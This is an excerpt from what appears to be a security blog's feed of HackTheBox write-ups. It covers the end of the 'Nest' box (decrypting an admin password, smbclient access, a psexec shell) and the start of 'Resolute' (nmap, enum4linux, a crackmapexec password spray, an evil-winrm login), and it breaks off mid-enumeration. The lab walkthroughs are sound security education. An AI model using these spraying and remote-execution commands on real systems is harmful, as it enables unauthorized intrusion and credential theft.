&lt;span class="code-line"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;ServiceSettings xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot; xmlns:xsd=&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;Port&amp;gt;4386&amp;lt;/Port&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;DebugPassword&amp;gt;WBQ201953D8w&amp;lt;/DebugPassword&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;QueryDirectory&amp;gt;C:\Program Files\HQK\ALL QUERIES&amp;lt;/QueryDirectory&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;/ServiceSettings&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We go to the LDAP directory. We found the exe we already got and a configuration
file. This file contain the Administrator encoded password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;setdir ldap&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Current directory set to ldap&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;list&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;QUERY FILES IN CURRENT DIRECTORY&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[1]   HqkLdap.exe&lt;/span&gt;
&lt;span class="code-line"&gt;[2]   Ldap.conf&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Current Directory: ldap&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;showquery 2&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Domain=nest.local&lt;/span&gt;
&lt;span class="code-line"&gt;Port=389&lt;/span&gt;
&lt;span class="code-line"&gt;BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local&lt;/span&gt;
&lt;span class="code-line"&gt;User=Administrator&lt;/span&gt;
&lt;span class="code-line"&gt;Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="reversing-hqkldapexe"&gt;"Reversing" HqkLdap.exe&lt;/h2&gt;
&lt;p&gt;We download the latest release of &lt;a href="https://github.com/0xd4d/dnSpy"&gt;dnSpy&lt;/a&gt; and
load the binary. We quickly find some encryption and decryption functions. They
are similar to the ones in the Utils.vb but use different parameters
(passphrase, salt, number of password iteration, initialisation vector and key
size).&lt;/p&gt;
&lt;p&gt;&lt;a href="/media/2020.06/nest_01.png"&gt;dnSpy&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We change the values in our previous module in MS Visual Basic 2010 Express and
rerun the code. The only changed line is the following:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Console.WriteLine(Decrypt("yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=", "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256))&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This give us the administrator password: XtH4nkS4Pl4y1nGX.&lt;/p&gt;
&lt;p&gt;We connect to the "C$" share as administrator and are able to get the root flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# smbclient //10.10.10.178/C$ -U &amp;quot;Administrator&amp;quot;%&amp;quot;XtH4nkS4Pl4y1nGX&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Try &amp;quot;help&amp;quot; to get a list of possible commads.&lt;/span&gt;
&lt;span class="code-line"&gt;smb: \&amp;gt; cd Users\Administrator\&lt;/span&gt;
&lt;span class="code-line"&gt;smb: \Users\Administrator\&amp;gt; cd Desktop\&lt;/span&gt;
&lt;span class="code-line"&gt;smb: \Users\Administrator\Desktop\&amp;gt; ls&lt;/span&gt;
&lt;span class="code-line"&gt;  .                                  DR        0  Sun Jan 26 02:20:50 2020&lt;/span&gt;
&lt;span class="code-line"&gt;  ..                                 DR        0  Sun Jan 26 02:20:50 2020&lt;/span&gt;
&lt;span class="code-line"&gt;  desktop.ini                       AHS      282  Sat Jan 25 17:02:44 2020&lt;/span&gt;
&lt;span class="code-line"&gt;  root.txt                            A       32  Mon Aug  5 18:27:26 2019&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                10485247 blocks of size 4096. 6449582 blocks available&lt;/span&gt;
&lt;span class="code-line"&gt;smb: \Users\Administrator\Desktop\&amp;gt; mget root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Get file root.txt? y&lt;/span&gt;
&lt;span class="code-line"&gt;getting file \Users\Administrator\Desktop\root.txt of size 32 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)n&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can also use psexec to directly execute commands on the system as
administrator.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python psexec.py administrator:XtH4nkS4Pl4y1nGX@10.10.10.178&lt;/span&gt;
&lt;span class="code-line"&gt;Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Requesting shares on 10.10.10.178.....&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Found writable share ADMIN$&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Uploading file xHADOhNA.exe&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Opening SVCManager on 10.10.10.178.....&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Creating service OtZQ on 10.10.10.178.....&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Starting service OtZQ.....&lt;/span&gt;
&lt;span class="code-line"&gt;[!] Press help for extra shell commands&lt;/span&gt;
&lt;span class="code-line"&gt;Microsoft Windows [Version 6.1.7601]&lt;/span&gt;
&lt;span class="code-line"&gt;Copyright (c) 2009 Microsoft Corporation.  All rights reserved.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Windows\system32&amp;gt;cd ../..&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\&amp;gt;cd Users\Administrator\Desktop&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Users\Administrator\Desktop&amp;gt;type root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;6594c2eb084bc0f08a42f0b94b878c41&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This box was interesting but a bit ctfish. I learn a few things about NTFS
alternate data stream and how to get them from a GNU/Linux box.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="VB"></category><category term=".NET"></category><category term="RE"></category><category term="SMB"></category><category term="Windows"></category></entry><entry><title>HTB: Resolute</title><link href="https://maggick.fr/2020/05/htb-resolute.html" rel="alternate"></link><published>2020-05-31T10:45:00+02:00</published><updated>2020-05-31T10:45:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-05-31:/2020/05/htb-resolute.html</id><summary type="html">&lt;p&gt;&lt;img alt="Resolute Card" class="align-left" src="/media/2020.05/resolute_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/220"&gt;Resolute&lt;/a&gt;.
This box was created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt; and publish on
December the 7th 2019. The box is rated as a medium box. It implies a lot of
enumeration and really interesting privilege escalation in Windows environment
using DLL injection.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.05/resolute_card.png" alt="Resolute Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/220"&gt;Resolute&lt;/a&gt;.
This box was created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt; and publish on
December the 7th 2019. The box is rated as a medium box. It implies a lot of
enumeration and really interesting privilege escalation in Windows environment
using DLL injection.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. As this is again (like with forest) a
domain contronler a few ports are open. So much ports are open that a full
TCPscan will take more than a day.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nmap -p- -sS 10.10.10.169 -oA nmap&lt;/span&gt;
&lt;span class="code-line"&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-10 09:49 EST&lt;/span&gt;
&lt;span class="code-line"&gt;Stats: 0:10:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan&lt;/span&gt;
&lt;span class="code-line"&gt;SYN Stealth Scan Timing: About 11.50% done; ETC: 11:22 (1:21:43 remaining)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Therefore we launch a basic nmap scan on the top 10 000 ports, 14 of them are
open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Fri Dec 13 03:00:17 2019 as: nmap -sS -oA nmap --top-ports 10000 10.10.10.169&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for megabank.local (10.10.10.169)&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.34s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 8306 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;53/tcp    open  domain&lt;/span&gt;
&lt;span class="code-line"&gt;88/tcp    open  kerberos-sec&lt;/span&gt;
&lt;span class="code-line"&gt;135/tcp   open  msrpc&lt;/span&gt;
&lt;span class="code-line"&gt;139/tcp   open  netbios-ssn&lt;/span&gt;
&lt;span class="code-line"&gt;389/tcp   open  ldap&lt;/span&gt;
&lt;span class="code-line"&gt;445/tcp   open  microsoft-ds&lt;/span&gt;
&lt;span class="code-line"&gt;464/tcp   open  kpasswd5&lt;/span&gt;
&lt;span class="code-line"&gt;593/tcp   open  http-rpc-epmap&lt;/span&gt;
&lt;span class="code-line"&gt;636/tcp   open  ldapssl&lt;/span&gt;
&lt;span class="code-line"&gt;3268/tcp  open  globalcatLDAP&lt;/span&gt;
&lt;span class="code-line"&gt;3269/tcp  open  globalcatLDAPssl&lt;/span&gt;
&lt;span class="code-line"&gt;5985/tcp  open  wsman&lt;/span&gt;
&lt;span class="code-line"&gt;9389/tcp  open  adws&lt;/span&gt;
&lt;span class="code-line"&gt;47001/tcp open  winrm&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Fri Dec 13 03:07:34 2019 -- 1 IP address (1 host up) scanned in 437.35 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run a version scan on this open ports. The ports 138 and 445 (SMB) are open
as well as port 5985 and 47001 for winRM.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Fri Dec 13 03:10:58 2019 as: nmap -sSV -oA service -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 10.10.10.169&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for megabank.local (10.10.10.169)&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.70s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE  SERVICE      VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;53/tcp    closed domain&lt;/span&gt;
&lt;span class="code-line"&gt;88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2019-12-13 08:19:12Z)&lt;/span&gt;
&lt;span class="code-line"&gt;135/tcp   open   msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn&lt;/span&gt;
&lt;span class="code-line"&gt;389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)&lt;/span&gt;
&lt;span class="code-line"&gt;445/tcp   open   microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)&lt;/span&gt;
&lt;span class="code-line"&gt;464/tcp   open   kpasswd5?&lt;/span&gt;
&lt;span class="code-line"&gt;593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0&lt;/span&gt;
&lt;span class="code-line"&gt;636/tcp   open   tcpwrapped&lt;/span&gt;
&lt;span class="code-line"&gt;3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)&lt;/span&gt;
&lt;span class="code-line"&gt;3269/tcp  open   tcpwrapped&lt;/span&gt;
&lt;span class="code-line"&gt;5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
&lt;span class="code-line"&gt;9389/tcp  open   mc-nmf       .NET Message Framing&lt;/span&gt;
&lt;span class="code-line"&gt;47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Fri Dec 13 03:11:28 2019 -- 1 IP address (1 host up) scanned in 30.41 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We enumerate the box using
&lt;a href="https://github.com/portcullislabs/enum4linux"&gt;enum4linux&lt;/a&gt; we got a list of
account and a description with a password in it &lt;code&gt;Welcome123!&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;perl enum4linux.pl 10.10.10.169&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;=============================&lt;/span&gt;
&lt;span class="code-line"&gt;|    Users on 10.10.10.169    |&lt;/span&gt;
&lt;span class="code-line"&gt;=============================&lt;/span&gt;
&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 866.&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail  Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela   Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette  Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika   Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire   Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude   Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia  Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo  Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus   Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak   Desc: Account created. Password set to Welcome123!&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie  Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki    Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo    Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally    Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon    Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve    Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie   Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita   Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The creds doesn't work and doesn't allow to access the SMB share. We put all
users in a file &lt;code&gt;users.txt&lt;/code&gt; and then we use
&lt;a href="https://github.com/byt3bl33d3r/CrackMapExec"&gt;crackmapexec&lt;/a&gt; to spray the
password against all accounts. The &lt;code&gt;melanie&lt;/code&gt; account is using the password!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;crackmapexec smb 10.10.10.169 -u users.txt -p &amp;#39;Welcome123!&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [*] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:MEGABANK)&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\Administrator:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\Guest:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\krbtgt:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\ryan:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\marko:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\sunita:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\abigail:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\marcus:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\sally:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\fred:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\angela:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\felicia:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\gustavo:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\ulf:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\stevie:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\claire:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\paulo:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\steve:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\annette:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\annika:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\per:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\claude:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [+] MEGABANK\melanie:Welcome123!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can then enumerate the shares but nothing interesting.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;crackmapexec smb 10.10.10.169 -u melanie -p &amp;#39;Welcome123!&amp;#39; --shares&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [*] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:MEGABANK)&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [+] MEGABANK\melanie:Welcome123!&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [+] Enumerating shares&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        SHARE           Permissions&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        -----           -----------&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        NETLOGON        READ&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        SYSVOL          READ&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        ADMIN$          NO ACCESS&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        IPC$            READ&lt;/span&gt;
&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        C$              NO ACCESS&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can then use &lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil-winrm&lt;/a&gt; to
connect using Winrm. This let us get the user flag in &lt;code&gt;melanie&lt;/code&gt; home folder.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ruby evil-winrm.rb -u melanie -p &amp;#39;Welcome123!&amp;#39; -i 10.10.10.169&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Evil-WinRM shell v1.8&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\melanie\Documents&amp;gt; type ..\Desktop\user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;0c3be45fcfe249796ccbee8d3a978540&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="second-user"&gt;Second user&lt;/h1&gt;
&lt;p&gt;We start enumerating the box. We can even run a
&lt;a href="https://github.com/fox-it/BloodHound.py"&gt;Bloodhound&lt;/a&gt; at it.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Melanie's groups" src="/media/2020.05/resolute_01.png"&gt;&lt;/p&gt;
&lt;p&gt;Nothing really interesting except when looking thoroughly at the content of the &lt;code&gt;C:\&lt;/code&gt; folder.
We found a &lt;code&gt;PSTranscripts&lt;/code&gt; folder. A
&lt;a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript"&gt;PSTranscript&lt;/a&gt;
is simply a transcript of a powershell session.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\&amp;gt; dir -force&lt;/span&gt;
&lt;span class="code-line"&gt;    Directory: C:\&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
&lt;span class="code-line"&gt;----                -------------         ------ ----&lt;/span&gt;
&lt;span class="code-line"&gt;d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN&lt;/span&gt;
&lt;span class="code-line"&gt;d--hsl        9/25/2019  10:17 AM                Documents and Settings&lt;/span&gt;
&lt;span class="code-line"&gt;d-----        9/25/2019   6:19 AM                PerfLogs&lt;/span&gt;
&lt;span class="code-line"&gt;d-r---        9/25/2019  12:39 PM                Program Files&lt;/span&gt;
&lt;span class="code-line"&gt;d-----       11/20/2016   6:36 PM                Program Files (x86)&lt;/span&gt;
